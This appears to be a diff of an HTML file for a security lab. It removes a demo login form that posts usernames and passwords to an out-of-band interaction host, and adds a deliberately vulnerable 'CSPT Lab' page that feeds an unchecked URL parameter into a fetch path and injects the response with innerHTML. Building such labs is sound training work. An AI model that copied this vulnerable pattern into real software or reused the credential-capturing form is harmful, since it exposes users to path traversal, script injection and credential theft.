@@ -1,45 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Page (Demo Only)</title>
-  <!-- Matomo -->
-<!-- Matomo -->
-<script>
-  var _paq = window._paq = window._paq || [];
-  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
-  _paq.push(['trackPageView']);
-  _paq.push(['enableLinkTracking']);
-  (function() {
-    var u="https://aman123123.matomo.cloud/";
-    _paq.push(['setTrackerUrl', u+'matomo.php']);
-    _paq.push(['setSiteId', '2']);
-    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-    g.async=true; g.src='https://cdn.matomo.cloud/aman123123.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
-  })();
-</script>
-<!-- End Matomo Code -->
-
-<!-- End Matomo Code -->
-
+  <title>CSPT Lab</title>
+</head>
 <body>
 
-<h2>Login</h2>
+<h2>User Dashboard</h2>
 
-<form action="https://1fm3yqu8ifscl7c8cgmllb76tzw53t1pi.oast.site" method="POST">
-    
-    <p>Username:</p>
-    <input type="text" name="username" placeholder="Enter username">
-    
-    <p>Password:</p>
-    <input type="password" name="password" placeholder="Enter password">
-    
-    <br><br>
-    <input type="submit" value="Login">
-    
-</form>
+<button onclick="loadTab('profile')">Profile</button>
+<button onclick="loadTab('settings')">Settings</button>
 
-<p>This is a demonstration form only.<br>
-Credentials are not checked and go nowhere real unless you set up your own server.</p>
+<div id="content"></div>
+
+<script>
+function loadTab(tab) {
+  fetch(`/pages/${tab}.html`)
+    .then(res => res.text())
+    .then(data => {
+      document.getElementById("content").innerHTML = data;
+    });
+}
+
+const params = new URLSearchParams(window.location.search);
+const tab = params.get("tab");
+if (tab) {
+  loadTab(tab);
+}
+</script>
 
 </body>
 </html>
